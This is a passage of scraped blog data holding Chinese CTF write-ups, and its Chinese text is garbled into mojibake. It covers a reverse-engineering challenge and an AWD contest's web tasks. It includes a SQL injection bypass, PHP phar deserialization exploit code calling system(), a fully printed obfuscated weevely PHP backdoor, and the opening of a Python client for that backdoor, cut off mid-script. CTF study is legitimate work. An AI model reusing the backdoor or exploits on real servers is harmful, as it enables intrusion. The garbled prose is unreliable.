è€Œä¸”åœ¨è¿è¡Œçš„æ—¶å€™ä¼šå‘ç°ï¼Œç¨‹åºä¼šåœ¨5ç§’ä¹‹å†…ç»“æŸã€‚æ•´ä¸ªé¢˜ç›®ç¬¬ä¸€çœ¼é€»è¾‘å°±æœ‰äº†\né™æ€è¾…åŠ© æå‡ºé™æ€åˆ†æå·¥å…·ï¼Œå‰é¢ä¸€å¤§æ®µå…¶å®æ˜¯å­—ç¬¦ä¸²åœ¨è®¡ç®—å¯¹é½çš„å†…å®¹ï¼Œä¸æ˜¯ç‰¹åˆ«é‡è¦ã€‚æ•´ä½“åˆ†æå°±ä¼šå‘ç°å…¶å®æ˜¯ä¸€ä¸ªç»™å­—ç¬¦ä¸²ç½®0çš„æ“ä½œã€‚ä¹‹åçš„ç¬¬ä¸€ä¸ªå‡½æ•°sub_80485E4();åœ¨æ‰“å°æ¬¢è¿å†…å®¹ï¼Œä¹‹åä¼šé‡åˆ°å‡½æ•°:\nif ( ptrace(0, 0, 1, 0) \u0026lt; 0 ) { puts(\u0026#34;Hey guys, what are you doing?!not cheat me~\u0026#34;); ++dword_804A0D8; exit(-1); } è¿™ä¸ªptraceä¸Šç½‘æŸ¥å°±ä¼šå‘ç°ï¼Œè¿™ä¸ªå‡½æ•°ä¼šé˜»æ­¢åŠ¨æ€è°ƒè¯•ï¼Œè¿™é‡Œå¯ä»¥é€‰æ‹©å°†è¿™ä¸ªå†…å®¹patchæ‰ï¼Œå°†äºŒè¿›åˆ¶å†…å®¹æ”¹æˆ90ï¼ˆnopï¼‰ï¼Œè·³è¿‡è¿™ä¸ªå†…å®¹ã€‚æˆ–è€…gdbè°ƒè¯•ç›´æ¥è·³è¿‡è¿™ä¸ªå†…å®¹ä¹Ÿå¯ä»¥ï¼Œåæ­£æœ‰åŠæ³•éƒ½è¡Œã€‚\nä¹‹åæ¥åˆ°è¿™ä¸ªåœ°æ–¹çš„é€»è¾‘:\nputs(\u0026#34;Hey you, what\u0026#39;s your password?\u0026#34;); puts(\u0026#34;format:nuaactf{}, length:24\u0026#34;); for ( i = 0; i \u0026lt; 24; ++i ) __isoc99_scanf(\u0026#34;%c\u0026#34;, i + a1); puts(\u0026#34;em?ok, you can get in...\u0026#34;); for ( j = 0; ; ++j ) { result = j; if ( j \u0026gt;= 24 ) break; *(_BYTE *)(j + a1) = ((int (__cdecl *)(_DWORD))loc_8048628)(*(unsigned __int8 *)(j + a1)); } å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„å†…å®¹å°±æ˜¯è®©æˆ‘ä»¬è¾“å…¥ä¸€æ®µç±»ä¼¼flagçš„å†…å®¹ï¼Œä¸è¿‡æ³¨æ„åˆ°ï¼Œæœ€åä¼šå¯¹æ•°ç»„a1çš„æ¯ä¸€ä¸ªå…ƒç´ è¿›è¡Œæ›´æ–°ï¼Œä½†æ˜¯ä¼¼ä¹æ˜¯ä¸€ä¸ªæ²¡æœ‰è¢«è¯†åˆ«æˆå‡½æ•°çš„å†…å®¹ï¼Œè·Ÿè¿›å»æŸ¥çœ‹ï¼Œå‘ç°ä¸€äº›å¥‡æ€ªçš„æŒ‡ä»¤é˜»æ­¢äº†ç¨‹åºçš„æ­£å¸¸è§£æï¼Œä¸è¿‡ä»”ç»†è§‚å¯Ÿï¼Œä¼¼ä¹è¿™ä¸ªè·³è½¬æ ¹æœ¬å°±ä¸ä¼šè°ƒç”¨åˆ°è¿™äº›ç¥å¥‡çš„æŒ‡ä»¤ï¼Œåˆ©ç”¨å‰é¢æ•™è¿‡çš„patchæ–¹æ³•ï¼Œå°±èƒ½å¤Ÿä¿®æ”¹æ‰ç¨‹åºå†…å®¹ï¼Œçœ‹åˆ°æ­£ç¡®çš„ç¨‹åºå†…å®¹:\nv2 = 0; for ( i = 0; i \u0026lt;= 7; ++i ) v2 |= (((signed int)a1 \u0026gt;\u0026gt; i) \u0026amp; 1) \u0026lt;\u0026lt; *(_BYTE *)(i + 0x804A0C2); return v2 è¿™ä¸ªå·¨å¤§çš„æ•°å­—å…¶å®æ˜¯ä¸€ä¸ªåœ°å€ï¼Œé‡Œé¢å†…å®¹ä¸º\n.data:0804A0C2 db 3 .data:0804A0C3 db 7 .data:0804A0C4 db 2 .data:0804A0C5 db 1 .data:0804A0C6 db 6 .data:0804A0C7 db 4 .data:0804A0C8 db 5 .data:0804A0C9 db 0 ç†è§£ä¸€ä¸‹ï¼Œå°±ç›¸å½“äºæ˜¯ä¸€ä¸ªæ•°ç»„çš„ä¸‹æ ‡iåœ¨éå†ã€‚æ€»çš„åˆ†æè¿™ä¸ªç®—æ³•ï¼Œå…¶å®å°±æ˜¯å°†ä¸€ä¸ªå­—èŠ‚çš„æ¯ä¸€bitçš„é¡ºåºé‡æ–°æ˜ å°„åˆ°ä¸€ä¸ªæ–°çš„ä½ç½®ä¸Šå…·ä½“å¯¹åº”å…³ç³»ä¸º:\n0 1 2 3 4 5 6 7 3 7 2 1 6 4 5 0 Cè¯­è¨€è¯¾ç¨‹ ç„¶åæœ‰ä¸€ä¸ªè®©å¤§å®¶è½»æ¾ä¸€ä¸‹çš„ç¯èŠ‚ï¼Œè®©å¤§å®¶è¾“å…¥ä¸€ä¸ªç¨‹åºçš„è¿è¡Œç»“æœã€‚è¿™ä¸ªä¸€çœ‹å°±æ˜¯å®å®šä¹‰çš„é”™è¯¯å®ä¾‹ï¼Œå³ä¼šäº§ç”Ÿä¸€ä¸ªéé¢„æœŸçš„ç­”æ¡ˆ\n1+3*1+4 = 8 ä¸è¿‡å…¶å®æ•´ä¸ªè€ƒå‡ºæ¥è·‘ä¹Ÿæ˜¯å¯ä»¥çš„~\næœ€åçš„ç­”æ¡ˆ æœ€åä¸€æ®µé€»è¾‘å¦‚ä¸‹\nv3 = -66; v4 = 116; v5 = 48; v6 = 48; v7 = -80; v8 = 124; v9 = -68; v10 = -14; v11 = 42; v12 = 48; v13 = 48; v14 = 16; v15 = 98; v16 = -74; v17 = 116; v18 = -26; v19 = -92; v20 = 88; v21 = 124; v22 = -26; v23 = 80; v24 = 124; v25 = 16; v26 = 118; puts(\u0026#34;Well,Well,You get here right?\u0026#34;); if ( !dword_804A0D8 || dword_804A0D0 ) { puts(\u0026#34;En?No No No you are not clever~\u0026#34;); } else { puts(\u0026#34;!!! Hey !!!\u0026#34;); puts(\u0026#34;Do you remember your password?\u0026#34;); for ( i = 0; i \u0026lt;= 23; ++i ) { *(_BYTE *)(a1 + i) = *(_BYTE *)(i + a1) ^ dword_804A0D4; if ( *(\u0026amp;v3 + i) != *(_BYTE *)(i + a1) ) break; } if ( i == 24 ) puts(\u0026#34;YOU ARE RIGHT!THE KEY IS FLAG!\u0026#34;); else puts(\u0026#34;O?Nearly\u0026#34;); } å¯ä»¥çœ‹åˆ°ç¦»æ­£ç¡®ç­”æ¡ˆå¾ˆè¿‘äº†~ ä¸è¿‡ä¼šå‘ç°ï¼Œä¸æ˜¯é‚£ä¹ˆå®¹æ˜“èƒ½å¤Ÿè¿›å…¥è¿™ä¸ªåŒ¹é…é€»è¾‘ã€‚ä»”ç»†è§‚å¯Ÿä¼šå‘ç°ï¼Œå˜é‡dword_804A0D8åœ¨ä¸€å¼€å§‹çš„ptraceå¤„å‡ºç°è¿‡ï¼Œè€Œdword_804A0D0åˆ™æ˜¯ä¼šåœ¨ä¸€ä¸ªhandleré‡Œé¢å‡ºç°ï¼Œè¿™ä¸ªhandlerå…¶å®æ˜¯æ³¨å†Œçš„ä¸€ä¸ªä¿¡å·äº‹ä»¶ï¼Œ5ç§’åè‡ªåŠ¨è·³è½¬ä¸º1ï¼ˆè¿™ä¸ªåœ°æ–¹å…¶å®æ˜¯å‘è°ƒè¯•å™¨ç”¨çš„ï¼Œå› ä¸ºè°ƒè¯•å™¨å¯ä»¥é€‰æ‹©å¿½ç•¥alarmä½†æ˜¯æ­¤æ—¶å˜é‡ä¾ç„¶ä¼šè¢«ç½®ä¸º1ï¼‰ä¸è¿‡ä¸€æ ·å¯ä»¥ç”¨å¼ºç¡¬çš„æ‰‹æ®µè·³è¿‡è¿™æ®µé€»è¾‘ã€‚ä¹‹åå‘ç°æ˜¯ä¸€æ®µå…³é”®é€»è¾‘æ¯”è¾ƒ\n*(_BYTE *)(a1 + i) = *(_BYTE *)(i + a1) ^ dword_804A0D4; if ( *(\u0026amp;v3 + i) != *(_BYTE *)(i + a1) ) break; å…¶ä¸­dword_804A0D4å­˜æ”¾äº†Cè¯­è¨€é‚£æ®µä¸­ï¼Œæˆ‘ä»¬è¾“å…¥çš„æ­£ç¡®ç­”æ¡ˆã€‚å¦‚æœè¾“å…¥æ­£ç¡®ç­”æ¡ˆï¼Œåˆ™ä¼šé€šè¿‡ä¸ä¸Šé¢å‡ºç°é‚£ä¸€å¤§æ®µæ•°å­—ï¼ˆå…¶å®æ˜¯ä¸€ä¸ªæ•°ç»„ï¼‰è¿›è¡Œå¼‚æˆ–ï¼Œå¾—åˆ°ç­”æ¡ˆã€‚äºæ˜¯æ€»ç»“ä¸‹æ¥ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°æ•´ä½“é€»è¾‘:\n é¦–å…ˆå¯¹è¾“å…¥è¿›è¡Œbitå˜åŒ– ä¸Cè¯­è¨€è¾“å…¥çš„æ­£ç¡®ç­”æ¡ˆè¿›è¡Œå¼‚æˆ– ä¸ç¨‹åºå†…éƒ¨çš„æ•°æ®æ¯”è¾ƒ  å› æ­¤å¯ä»¥å†™å‡ºè§£å¯†é€»è¾‘:\n# -*- coding:utf-8 -*- bit_map = [7, 3, 2, 0, 5, 6, 4, 1] check = [190, 116, 48, 48, 176, 124, 188, 242, 42, 48, 48, 16, 98, 182, 116, 230, 164, 88, 124, 230, 80, 124, 16, 118] right_answer = 8 def bit_detrans(num): tmp_u = 0 for i in range(8): tmp = (num \u0026gt;\u0026gt; i) \u0026amp; 0x1 tmp_u |= (tmp \u0026lt;\u0026lt; bit_map[i]) return tmp_u tmp = [each ^ right_answer for each in check] ans = [chr(bit_detrans(each)) for each in tmp] print(\u0026#39;\u0026#39;.join(ans)) # nuaactf{Haa!You_G0t_1t!} Misc ç­¾åˆ°é¢˜ æ‰“å¼€å³é€flag\nfs apfs\ndmgæœ«å°¾ç»™äº†12ä½çš„å¯†ç Xmas3?theme3\nç›´æ¥æ‰“å¼€dmgå¾—åˆ°flag.txt\nrev pyc\nwith open(\u0026#39;rev\u0026#39;, \u0026#39;rb\u0026#39;) as f1: with open(\u0026#39;genflag\u0026#39;, \u0026#39;wb\u0026#39;) as f2: f2.write(f1.read()[::-1]) å¾—åˆ°genflagåï¼Œmodu1eéœ€è¦æ”¹ä¸ºmodule\nç”¨uncompyle6\nuncompyle6 -o . genflag å‚è€ƒencå†™dec\ndef enc(): flag = r\u0026#39;To make it more difficult to calculate the flag by hand, nuaactf{py_uncompyle}, flag is for scripts\u0026#39; [print(\u0026#39;{:x}\u0026#39;.format(ord(each)+0x32), end=\u0026#39;l\u0026#39;) for each in flag] print() def dec(): enc_flag = \u0026#39;86la1l52l9fl93l9dl97l52l9bla6l52l9fla1la4l97l52l96l9bl98l98l9bl95la7l9ela6l52la6la1l52l95l93l9el95la7l9el93la6l97l52la6l9al97l52l98l9el93l99l52l94labl52l9al93la0l96l5el52la0la7l93l93l95la6l98ladla2labl91la7la0l95la1l9fla2labl9el97lafl5el52l98l9el93l99l52l9bla5l52l98la1la4l52la5l95la4l9bla2la6la5l\u0026#39; enc_flag = enc_flag[:-1].split(\u0026#39;l\u0026#39;) for each in enc_flag: print(chr(int(each, 16)-0x32), end=\u0026#39;\u0026#39;) print() enc() dec() å¾—åˆ°flag\nplot g-code plot\nhttps://ncviewer.com/\n","date":"2018-12-25T12:23:41Z","permalink":"https://blog.zeddyu.info/2018/12/25/NUAACTF-2018-%E5%AE%98%E6%96%B9wp/","title":"NUAACTF_2018 å®˜æ–¹wp"},{"content":"è¿™æ¬¡æ¯”èµ›åœ¨èµ›å‰çœ‹è§„åˆ™æˆ‘è§‰å¾—è¿˜æŒºæœ‰æ„æ€çš„ï¼Œæ¯•ç«Ÿæ˜¯é‡‡ç”¨ä¸€ç§æ–°çš„AWDå½¢å¼ï¼ŒWebæ–¹é¢é‡‡ç”¨çš„æ˜¯æ­£åˆ™é…wafçš„å½¢å¼å»é˜²å¾¡ï¼Œç„¶åå½“åˆç»™@Mioå¸ˆå‚…çœ‹çš„æ—¶å€™ï¼Œä»–è¡¨ç¤ºä¹ŸæŒºæƒ³æ¥çš„ã€‚å¯æƒœä»–ä»¬å­¦æ ¡æ²¡æŠ¥é”€å°±æ²¡æ¥äº†ã€‚è¿™æ¬¡å°±å†™å†™è¿™ä¸¤å¤©çš„æ¯”èµ›ç»éªŒå§ã€‚\n[TOC]\nDay 1 ç¬¬ä¸€å¤©æ˜¯CTFè§£é¢˜èµ›ï¼Œä¸€å…±æ˜¯5ä¸ªwebã€‚ç”±äºä¸èƒ½å¤ç°ï¼Œå®˜æ–¹ä¹Ÿæ²¡æœ‰ç»™æºç ï¼Œè¿™é‡Œä»…èƒ½å‡­é ç€è®°å¿†å†™ä¸€ä¸‹ã€‚æ¥åˆ°æ¯”èµ›ç°åœºæ‹¿åˆ°ipçš„æ—¶å€™ï¼Œæˆ‘ä»¬çš„å…¨èƒ½é€‰æ‰‹@hac45 å°±ç«‹é©¬æ‰«äº†ä¸€ä¸‹æˆ‘ä»¬çš„ipæ®µï¼Œä¹ŸæˆåŠŸå‘ç°äº†é¢˜ç›®ï¼Œæ­¤æ—¶è·ç¦»æ¯”èµ›å¼€å§‹åº”è¯¥å·®30minå·¦å³ã€‚åŸºæœ¬æŠŠ5ä¸ªwebéƒ½æ‰«åˆ°äº†ã€‚å…¶ä¸­web5æ‰«åˆ°äº†gitæ³„éœ²ï¼Œç„¶åç«‹é©¬æ‹¿åˆ°äº†æºç ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰ç¬¬ä¸€æ—¶é—´åšï¼Œå› ä¸ºæˆ‘ä¹Ÿæ‹…å¿ƒä¸‡ä¸€ä»–ä¸æ”¾è¿™é“é¢˜ï¼Œæˆ‘æœ‰å¯èƒ½ç™½è´¹åŠŸå¤«ï¼Œå³ä½¿æ”¾å‡ºæ¥äº†æˆ‘ä¹Ÿä¼šæ¯”å…¶ä»–é˜Ÿç¨å¾®å¿«ä¸€æ­¥ï¼Œå°±æš‚æ—¶æåœ¨ä¸€è¾¹äº†ã€‚\n  ç°åœ¨æ˜¯12æœˆ4æ—¥ï¼Œæ¯”èµ›è¿‡å»å·²ç»æœ‰ä¸€æ®µæ—¶é—´äº†ã€‚è¿™é‡Œå¤§ä½“å°±æ˜¯æ ¹æ®å›å¿†æ¥å†™çš„\n å¥½äº†å°±ä¸æ‰¯å¤ªå¤šçš„æƒ³æ³•äº†ã€‚ç›´æ¥åˆ‡å…¥æŠ€æœ¯ç‚¹ã€‚\nWeb 1 ä¸€é“sqlæ³¨å…¥çš„é¢˜\u0026hellip;ä¸‡èƒ½å¯†ç ï¼Œå› ä¸ºè¿‡æ»¤äº†ä¸¤ç§æ³¨é‡Šæ–¹å¼ï¼Œæ‰€ä»¥éœ€è¦é—­åˆæœ€åçš„'\n1'/**/order/**/by/**/'1 Web 2 pharååºåˆ—åŒ–\n\u0026lt;?php class MyClass{ var $output = \u0026#39;echo \u0026#34;hahaha\u0026#34;;\u0026#39;; function __destruct(){ eval($this -\u0026gt; output); } } $phar = new Phar(\u0026#34;zedd.phar\u0026#34;); //åç¼€åå¿…é¡»ä¸ºphar  $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#34;GIF89a\u0026#34;.\u0026#34;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); //è®¾ç½®stub  $o = new MyClass(); $o-\u0026gt;output = \u0026#34;system(\u0026#39;ls\u0026#39;);\u0026#34;; $phar-\u0026gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest  //ç­¾åè‡ªåŠ¨è®¡ç®—  $phar-\u0026gt;stopBuffering(); ?\u0026gt;å¾—åˆ°çš„pharæ”¹ä¸ªåç¼€åjpgï¼Œç„¶åå…ˆç»•è¿‡ä¸Šä¼ ï¼Œå†ç”¨å¦ä¸€ä¸ªphpæ–‡ä»¶å»åŒ…å«å³å¯å¾—åˆ°å›æ˜¾ã€‚\nè¿™é‡Œæ²¡æœ‰è®°å½•äº†â€¦å°±å¤§æ¦‚è¯´ä¸€ä¸‹ï¼Œè€ƒç‚¹ä¸»è¦æ˜¯pharååºåˆ—åŒ–ï¼Œæ²¡ä»€ä¹ˆéš¾åº¦ã€‚å¯æƒœæ²¡æ‹¿åˆ°ä¸€è¡€ã€‚\nWeb 3 è¿™é¢˜indexåªæ˜¾ç¤ºäº†ä¸€ä¸ªä»generate.phpè·å–å¾—åˆ°çš„md5ï¼Œè€Œä¸”è·å–çš„å‚æ•°æœ‰æ²¡æœ‰éƒ½æ— æ‰€è°“ã€‚èµ›åå¬è¯´è¿˜æœ‰generate.php.bakï¼Œä½†æ˜¯æˆ‘ä»¬æ²¡æ‰«åˆ°\u0026hellip;\næ²¡çœ‹æ‡‚\u0026hellip;\nWeb3ç»™äº†hint phpjmï¼Œä½†æ˜¯æˆ‘ä»¬ç”±äºæ²¡æœ‰å¤–ç½‘ï¼Œä¹Ÿæ²¡æœ‰å¾ˆç»†è‡´åœ°ç ”ç©¶è¿‡ï¼Œåªæ˜¯å•çº¯çš„å›ç”¨çº¿ä¸Šè§£å¯†ã€‚æ‰€ä»¥å°±æ”¾å¼ƒäº†ã€‚\nWeb 4 ç”¨vue.jsåšçš„ä¸€ä¸ªç«™ï¼Œä½†æ˜¯ç”±äºæœåŠ¡å™¨ä¹Ÿæ²¡æœ‰å¤–ç½‘ï¼Œä½†æ˜¯vue.jsåˆç”¨äº†cdnçš„æ–¹å¼å¼•å…¥ï¼Œå½“æ—¶é¡µé¢å¤§æ¦‚å°±æ˜¯\nHello, {{ name }} ä¸å¤ªæ‡‚\u0026hellip;\nWeb 5 é€šè¿‡æ‰«æå‘ç°gitæ³„æ¼ï¼Œä½†æ˜¯ç”¨Githackåªæ‹–åˆ°äº†ä¸€ä¸ªæ–‡ä»¶rrrrrrrrrrrrradme.php\n\u0026lt;?php echo \u0026#39;this is a file in the path 303f0ca4472df9e21be369308af5685f\u0026#39;; ç„¶åå‘ç°303f0ca4472df9e21be369308af5685fç¡®å®æ˜¯ä¸ªç›®å½•ã€‚è¿™é‡Œæˆ‘ä»¬å‚è€ƒç½‘é¼æ¯ç¬¬å››åœºä¸€é“é¢˜çš„åšæ³•ï¼Œç½‘é¼æ¯ç¬¬å››åœºSome Web Writeup\ncat refs/stash eb49f8e2a56728a60ca28b46b35eebfc686dbf75 git cat-file -p eb49 tree a9a44c4bc2732e1ddf5471955d4d41b7e0388419 parent f1358a6b48fd88cf4e70d92e99374c5746320d80 parent 0fe6eac337d025cadd3dfe361ace9c8d564114bc author testforctf \u0026lt;test_for_ctf@github.com\u0026gt; 1541673356 +0800 committer testforctf \u0026lt;test_for_ctf@github.com\u0026gt; 1541673356 +0800 On master: rrrrrrrrrrrrradme.php git ls-tree a9a4 100644 blob fcd1b82307da944a573344988d291b869df17493\tdem0000000000.php 100644 blob e4ab881f33fd5e4726079a15fbe2d2a338d5ab0d\trrrrrrrrrrrrradme.php git cat-file -p fcd1b82307da944a573344988d291b869df17493 \u0026lt;?php $A = \u0026#39;$j=0;(TI$j\u0026lt;$c\u0026amp;\u0026amp;TI$i\u0026lt;TI$l);$j+TITI+,$i++){$o.=TI$TIt{$i}^$k{TI$j};}}rTIeTIturn $o;}TI$r=$_STIERVTIETIR;$rr=@$r[\u0026#34;HTITTP_REFERE\u0026#39;; $o = \u0026#39;TI;$q=array_TIvaluesTI($TIq);pregTI_mTIatch_all(\u0026#34;/([TI\\\\w])[\\\\TIw-]+(?:;TIq=TITI0.(TI[\\\\d]))?,?/\u0026#34;,$ra,$m)TI;iTIfTI($q\u0026amp;\u0026amp;$m){@s\u0026#39;; $F = \u0026#39;_replacTIe(arraTIy(\u0026#34;/_TI/\u0026#34;TI,\u0026#34;/-/\u0026#34;),arrTIay(\u0026#34;/TI\u0026#34;,\u0026#34;+\u0026#34;)TI,$TIssTI($TIs[$i],0,$e))),$k))TI);$o=obTI_gTITIet_contents();TIob_\u0026#39;; $H = \u0026#39;ITI][$z]];if(sTItrpos($TIp,$hTITI)===0){$s[$i]=TITI\u0026#34;\u0026#34;;$p=$ss($pTI,3)TI;}iTIf(array_key_TIexistsTI($i,$s)){TI$TIs[$i].=$TIp\u0026#39;; $p = \u0026#39;I5($i.TITI$TIkh),0,3));$f=$sTIl($ss(TImd5($i.$TIkf),TI0,TI3));$TIp=\u0026#34;\u0026#34;;for($z=1;$TIz\u0026lt;cTIount($m[TI1]);TI$TIz++)$p.=$q[$TIm[2T\u0026#39;; $a = \u0026#39;R\u0026#34;]TI;$rTIa=@$r[\u0026#34;HTTPTI_ACCETIPT_LANGTIUAGETI\u0026#34;];if($rr\u0026amp;\u0026amp;TI$ra){TI$TIu=parTIse_urTIl($TIrr);parse_str($TIu[\u0026#34;qTIuery\u0026#34;],$TIq)\u0026#39;; $m = \u0026#39;eTIssion_TITIstart();$s=\u0026amp;$TI_SETISSION;$ssTI=\u0026#34;sTIuTITITIbstr\u0026#34;;$sl=\u0026#34;TIstrtolower\u0026#34;;$i=$m[1][0]TITI.$mTI[1][TI1];$h=$sl($ss(mdT\u0026#39;; $i = str_replace(\u0026#39;Bm\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;cBmBmreate_BmfuBmncBmBmtion\u0026#39;); $x = \u0026#39;;$e=sTItrpos(TI$s[$iTI]TI,$f);if($TIe){$k=$kh.TI$kf;ob_staTIrt(TI)TI;@TIevTIal(@gzTIuncomTIpress(@x(@baseTI64_dTIecode(preg\u0026#39;; $D = \u0026#39;end_TIclean(TI);$d=TIbaseTI64TI_enTIcode(x(gzcoTImpress($o),$TITIk));TIprint(\u0026#34;\u0026lt;$k\u0026gt;$TId\u0026lt;/TI$kTI\u0026gt;\u0026#34;);@sTIesTIsion_destroy();}}}}\u0026#39;; $r = \u0026#39;$kh=\u0026#34;bTIa59\u0026#34;;$TIkf=TI\u0026#34;9TIae2\u0026#34;;functionTI x($t,$kTI){$c=strlTIen($TIk);$lTI=strlTIen($t);$o=TI\u0026#34;\u0026#34;;fTIor($i=0TI;$i\u0026lt;TI$TIl;){forTI(\u0026#39;; $J = str_replace(\u0026#39;TI\u0026#39;, \u0026#39;\u0026#39;, $r . $A . $a . $o . $m . $p . $H . $x . $F . $D); $K = $i(\u0026#39;\u0026#39;, $J); $K(); ?\u0026gt; å¾—åˆ°å¦ä¸€ä¸ªæ–‡ä»¶ï¼Œdem0000000000.php\n\u0026lt;?php $A = \u0026#39;$j=0;(TI$j\u0026lt;$c\u0026amp;\u0026amp;TI$i\u0026lt;TI$l);$j+TITI+,$i++){$o.=TI$TIt{$i}^$k{TI$j};}}rTIeTIturn $o;}TI$r=$_STIERVTIETIR;$rr=@$r[\u0026#34;HTITTP_REFERE\u0026#39;; $o = \u0026#39;TI;$q=array_TIvaluesTI($TIq);pregTI_mTIatch_all(\u0026#34;/([TI\\\\w])[\\\\TIw-]+(?:;TIq=TITI0.(TI[\\\\d]))?,?/\u0026#34;,$ra,$m)TI;iTIfTI($q\u0026amp;\u0026amp;$m){@s\u0026#39;; $F = \u0026#39;_replacTIe(arraTIy(\u0026#34;/_TI/\u0026#34;TI,\u0026#34;/-/\u0026#34;),arrTIay(\u0026#34;/TI\u0026#34;,\u0026#34;+\u0026#34;)TI,$TIssTI($TIs[$i],0,$e))),$k))TI);$o=obTI_gTITIet_contents();TIob_\u0026#39;; $H = \u0026#39;ITI][$z]];if(sTItrpos($TIp,$hTITI)===0){$s[$i]=TITI\u0026#34;\u0026#34;;$p=$ss($pTI,3)TI;}iTIf(array_key_TIexistsTI($i,$s)){TI$TIs[$i].=$TIp\u0026#39;; $p = \u0026#39;I5($i.TITI$TIkh),0,3));$f=$sTIl($ss(TImd5($i.$TIkf),TI0,TI3));$TIp=\u0026#34;\u0026#34;;for($z=1;$TIz\u0026lt;cTIount($m[TI1]);TI$TIz++)$p.=$q[$TIm[2T\u0026#39;; $a = \u0026#39;R\u0026#34;]TI;$rTIa=@$r[\u0026#34;HTTPTI_ACCETIPT_LANGTIUAGETI\u0026#34;];if($rr\u0026amp;\u0026amp;TI$ra){TI$TIu=parTIse_urTIl($TIrr);parse_str($TIu[\u0026#34;qTIuery\u0026#34;],$TIq)\u0026#39;; $m = \u0026#39;eTIssion_TITIstart();$s=\u0026amp;$TI_SETISSION;$ssTI=\u0026#34;sTIuTITITIbstr\u0026#34;;$sl=\u0026#34;TIstrtolower\u0026#34;;$i=$m[1][0]TITI.$mTI[1][TI1];$h=$sl($ss(mdT\u0026#39;; $i = str_replace(\u0026#39;Bm\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;cBmBmreate_BmfuBmncBmBmtion\u0026#39;); $x = \u0026#39;;$e=sTItrpos(TI$s[$iTI]TI,$f);if($TIe){$k=$kh.TI$kf;ob_staTIrt(TI)TI;@TIevTIal(@gzTIuncomTIpress(@x(@baseTI64_dTIecode(preg\u0026#39;; $D = \u0026#39;end_TIclean(TI);$d=TIbaseTI64TI_enTIcode(x(gzcoTImpress($o),$TITIk));TIprint(\u0026#34;\u0026lt;$k\u0026gt;$TId\u0026lt;/TI$kTI\u0026gt;\u0026#34;);@sTIesTIsion_destroy();}}}}\u0026#39;; $r = \u0026#39;$kh=\u0026#34;bTIa59\u0026#34;;$TIkf=TI\u0026#34;9TIae2\u0026#34;;functionTI x($t,$kTI){$c=strlTIen($TIk);$lTI=strlTIen($t);$o=TI\u0026#34;\u0026#34;;fTIor($i=0TI;$i\u0026lt;TI$TIl;){forTI(\u0026#39;; $J = str_replace(\u0026#39;TI\u0026#39;, \u0026#39;\u0026#39;, $r . $A . $a . $o . $m . $p . $H . $x . $F . $D); $K = $i(\u0026#39;\u0026#39;, $J); $K(); ?\u0026gt;å½“æ—¶å¹¶ä¸çŸ¥é“è¿™æ˜¯ä¸ªä»€ä¹ˆï¼Œç¡¬ç€å¤´çš®é€†äº†æŒºä¹…çš„ã€‚è€Œä¸”é˜Ÿå‹æ‰”è¿‡æ¥ç»™æˆ‘çš„å°±æ˜¯ä¸ªç»è¿‡ä»–ç¾åŒ–åçš„ç‰ˆæœ¬ï¼Œæˆ‘ä¹Ÿæ²¡å¤ªåœ¨æ„ã€‚åæ¥æˆ‘ä»¬æ‰çŸ¥é“åŸæ¥æ˜¯ä¸ªweevelyé©¬ï¼Œï¼ˆæˆ‘è¯´æ€ä¹ˆè¿™ä¹ˆçœ¼ç†Ÿã€‚è™½ç„¶æˆ‘ä»¬åœ¨èµ›åœºé€†æˆåŠŸäº†ï¼Œæœ¬åœ°ä¹Ÿå¯ä»¥æ‰§è¡Œäº†ï¼Œä½†æ˜¯å°±æ˜¯æ‰¾ä¸åˆ°è¿™ä¸ªweevelyé©¬çš„ä½ç½®ï¼Œå¯¼è‡´å½“æ—¶æ²¡åšå‡ºæ¥\u0026hellip;\nè‡³äºweevelyé©¬ï¼Œç”¨ç›®å‰githubä¸Šçš„weevely3å¾—åˆ°é©¬è·Ÿè¿™ä¸ªä¸ä¸€æ ·ï¼Œè¿™ä¸ªæ˜¯ç”±kaliä¸‹çš„weevelyäº§ç”Ÿçš„ï¼Œç„¶åæˆ‘ä»¬å‚è€ƒäº†ä¸€å€‹PHPæ··æ·†å¾Œé–€çš„åˆ†æï¼Œå¯ä»¥ä½¿ç”¨æ–‡æœ«çš„expåˆ©ç”¨ä¸€æ³¢ã€‚\n# encoding: utf-8 from random import randint,choice from hashlib import md5 import urllib import string import zlib import base64 import requests import re def choicePart(seq,amount): length = len(seq) if length == 0 or length \u0026lt; amount: print \u0026#39;Error Input\u0026#39; return None result = [] indexes = [] count = 0 while count \u0026lt; amount: i = randint(0,length-1) if not i in indexes: indexes.append(i) result.append(seq[i]) count += 1 if count == amount: return result def randBytesFlow(amount): result = \u0026#39;\u0026#39; for i in xrange(amount): result += chr(randint(0,255)) return result def randAlpha(amount): result = \u0026#39;\u0026#39; for i in xrange(amount): result += choice(string.ascii_letters) return result def loopXor(text,key): result = \u0026#39;\u0026#39; lenKey = len(key) lenTxt = len(text) iTxt = 0 while iTxt \u0026lt; lenTxt: iKey = 0 while iTxt\u0026lt;lenTxt and iKey\u0026lt;lenKey: result += chr(ord(key[iKey]) ^ ord(text[iTxt])) iTxt += 1 iKey += 1 return result def debugPrint(msg): if debugging: print msg # config debugging = False keyh = \u0026#34;4f7f\u0026#34; # $kh keyf = \u0026#34;28d7\u0026#34; # $kf xorKey = keyh + keyf url = \u0026#39;http://example.com/backdoor.php\u0026#39; defaultLang = \u0026#39;zh-CN\u0026#39; languages = [\u0026#39;zh-TW;q=0.%d\u0026#39;,\u0026#39;zh-HK;q=0.%d\u0026#39;,\u0026#39;en-US;q=0.%d\u0026#39;,\u0026#39;en;q=0.%d\u0026#39;] proxies = None # {\u0026#39;http\u0026#39;:\u0026#39;http://127.0.0.1:8080\u0026#39;} # proxy for debug sess = requests.Session() # generate random Accept-Language only once each session langTmp = choicePart(languages,3) indexes = sorted(choicePart(range(1,10),3), reverse=True) acceptLang = [defaultLang] for i in xrange(3): acceptLang.append(langTmp[i] % (indexes[i],)) acceptLangStr = \u0026#39;,\u0026#39;.join(acceptLang) debugPrint(acceptLangStr) init2Char = acceptLang[0][0] + acceptLang[1][0] # $i md5head = (md5(init2Char + keyh).hexdigest())[0:3] md5tail = (md5(init2Char + keyf).hexdigest())[0:3] + randAlpha(randint(3,8)) 